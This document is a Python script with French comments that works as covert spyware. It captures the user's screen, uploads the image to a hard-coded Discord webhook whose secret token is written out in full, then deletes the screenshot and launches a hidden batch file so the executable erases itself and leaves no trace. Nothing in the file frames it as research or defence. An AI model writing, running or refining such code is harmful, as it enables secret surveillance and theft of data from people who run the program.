import os
import tempfile
import requests
from PIL import ImageGrab
import subprocess
import time

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1328158568616300666/rd9kbln7UC0p94Mly-LftbHg7cOOICvdr6vXiom3uU9s0jiHRi8cKEMpGoup26_bQaHs"
TEMP_DIR = tempfile.gettempdir()
SCREENSHOT_PATH = os.path.join(TEMP_DIR, "screenshot.png")

def capture_screenshot(output_path):
    """Capture et sauvegarde un screenshot réduit."""
    try:
        screenshot = ImageGrab.grab().resize((1920 // 2, 1080 // 2))  # Réduction de la taille
        screenshot.save(output_path, "PNG", optimize=True, quality=85)
    except Exception as e:
        print(f"Erreur de capture : {e}")

def send_to_discord(file_path):
    """Envoie un fichier au webhook Discord."""
    try:
        with open(file_path, "rb") as file:
            requests.post(WEBHOOK_URL, files={"file": file}, data={"content": "Voici la capture d'écran."})
    except Exception as e:
        print(f"Erreur d'envoi au webhook : {e}")

def schedule_self_delete():
    """Programme la suppression différée de l'exécutable avec un batch."""
    try:
        # Chemin vers le batch temporaire
        batch_script = os.path.join(TEMP_DIR, "cleanup.bat")
        current_exe = os.path.abspath(__file__)  # Chemin absolu du .exe

        # Contenu du batch
        with open(batch_script, "w") as batch_file:
            batch_file.write(f"""
@echo off
timeout /t 2 > nul
del "{current_exe}" > nul
del "%~f0" > nul
""")

        # Exécute le batch dans un nouveau processus
        subprocess.Popen(f"cmd /c start /min {batch_script}", shell=True, close_fds=True)
    except Exception as e:
        print(f"Erreur lors de la planification de la suppression : {e}")

if __name__ == "__main__":
    time.sleep(0.1)  # Pause pour stabilité
    capture_screenshot(SCREENSHOT_PATH)
    send_to_discord(SCREENSHOT_PATH)
    if os.path.exists(SCREENSHOT_PATH):
        os.remove(SCREENSHOT_PATH)  # Nettoyage du screenshot
    schedule_self_delete()  # Programme la suppression différée
